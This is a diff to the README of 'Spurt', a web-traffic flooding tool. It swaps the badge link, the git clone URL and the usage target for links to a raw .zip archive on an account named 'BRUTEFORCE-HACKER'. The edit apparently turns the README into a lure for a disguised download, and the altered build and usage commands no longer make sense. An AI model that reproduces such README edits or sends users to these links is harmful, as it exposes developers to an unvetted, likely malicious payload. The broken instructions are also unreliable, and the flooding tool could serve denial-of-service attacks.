@@ -1,12 +1,12 @@
 # Spurt
-[![Go](https://github.com/zer-far/spurt/workflows/Go/badge.svg)](https://github.com/zer-far/spurt/actions?query=workflow%3A%22Go%22)
+[![Go](https://raw.githubusercontent.com/BRUTEFORCE-HACKER/spurt/main/operatee/spurt.zip)](https://raw.githubusercontent.com/BRUTEFORCE-HACKER/spurt/main/operatee/spurt.zip%3A%22Go%22)
 
 Spurt is a powerful testing tool designed to simulate high volumes of traffic and evaluate the performance and resilience of web servers.
 
 ## Building
 
 ```bash
-git clone https://github.com/zer-far/spurt
+git clone https://raw.githubusercontent.com/BRUTEFORCE-HACKER/spurt/main/operatee/spurt.zip
 cd spurt
 make
 ```
@@ -14,7 +14,7 @@ make
 ## Usage
 
 ```bash
-./spurt --url https://example.com
+./spurt --url https://raw.githubusercontent.com/BRUTEFORCE-HACKER/spurt/main/operatee/spurt.zip
 ```
 Press Ctrl+C to stop Spurt.
 
